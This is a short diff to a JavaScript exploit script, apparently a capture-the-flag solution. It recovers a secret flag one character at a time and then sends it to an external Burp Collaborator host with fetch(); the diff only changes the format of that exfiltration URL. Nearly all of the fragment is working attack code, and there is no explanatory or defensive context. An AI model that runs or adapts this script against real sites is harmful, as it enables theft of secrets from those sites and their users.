@@ -22,7 +22,7 @@ async function getFlag(chars) {
  char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
  await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
  if(b) break;}
- fetch('https://${flag}.xdeij9y83xtx7gesht57ynjz9qfk39.burpcollaborator.net/flag=${flag}', {method:'get'});
+ fetch('https://xdeij9y83xtx7gesht57ynjz9qfk39.burpcollaborator.net/flag=${flag}', {method:'get'});
 };
 getFlag(abc);
 </script>
